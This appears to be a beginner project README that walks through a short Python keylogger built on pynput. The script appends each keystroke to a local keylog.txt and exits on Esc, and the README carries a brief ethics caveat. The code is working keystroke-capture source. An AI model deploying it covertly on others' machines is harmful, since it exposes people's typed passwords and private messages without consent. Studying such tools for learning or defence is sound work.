# Simple-Keylogger
Create a basic keylogger program that records and logs keystrokes.Focus on logging the keys pressed and saving them to a file. Note Ethical considearations and permissions are crucial for projects involving keyloggers.

* This Python script is a basic keylogger using the pynput library, which allows monitoring and controlling input devices like the keyboard and mouse. Here's a step-by-step breakdown of the code:

## 1. Import Necessary Modules
```
import pynput
from pynput.keyboard import Key, Listener
```
* `pynput`: A library for monitoring and controlling keyboard and mouse input.
* `Key`: Contains special keys such as `esc`, `shift`, `ctrl`, etc.
* `Listener`: A class used to listen for keyboard events (key presses and releases).

## 2. Log File Setup
```
log_file = "keylog.txt"
```
* Specifies the file where the keypresses will be logged.
* The file will be created in the same directory as the script if it doesn’t exist.

## 3. `on_press` Function
```
def on_press(key):
    # Write the pressed key to the log file
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")
```
* Purpose: Handles events when a key is pressed.
* Steps:
        1. Opens the log file in append mode `("a")` so that new keypresses are added to the file without overwriting previous entries.
        2. Converts the `key` object to a string using `str(key)`.
        3. Writes the string representation of the key to the log file followed by a newline.

## 4. `on_release` Function
```
def on_release(key):
    # Stop the listener when the 'esc' key is pressed
    if key == Key.esc:
        return False
```
* Purpose: Handles events when a key is released.
* Steps:
        1. Checks if the released `key` is the `esc` key.
        2. If true, returns `False`, which stops the listener and ends the program.

## 5. Create and Start the Listener
```
listener = Listener(on_press=on_press, on_release=on_release)
```
* `Listener`: Initializes a keyboard listener.
* ## Parameters:
    1. on_press: The callback function triggered whenever a key is pressed.
    2. on_release: The callback function triggered whenever a key is released.

## 6. Start and Join the Listener
```
listener.start()
listener.join()
```
* `listener.start()`: Starts the listener in a non-blocking thread, allowing it to monitor keyboard input.
* `listener.join()`: Keeps the program running until the listener stops (e.g., when the  `esc` key is pressed).

## 7. Execution Flow
   1. The script creates a log file `(keylog.txt)` for storing keypress data.
   2. A listener is initialized to capture keypress and key release events.
   3. Each key pressed is recorded in `keylog.txt` as a string.
   4. The program runs indefinitely, monitoring keyboard input.
   5. When the `esc` key is released, the listener stops, and the program exits.

## 8. Important Notes

### `Log File Output`: 
   Keypresses are logged as strings, with special keys (like `Key.space`, `Key.enter`) appearing as their symbolic names. For example:
```
'a'
'b'
Key.space
Key.enter
```
* ### Keyboard Privacy: 
    This code is a simple keylogger and should be used responsibly, respecting legal and ethical considerations.
* ### Interrupting the Program: 
    The listener stops only when the `esc` key is pressed. To force stop, you can use a terminal interrupt (`Ctrl+C`) if running in an interactive environment.
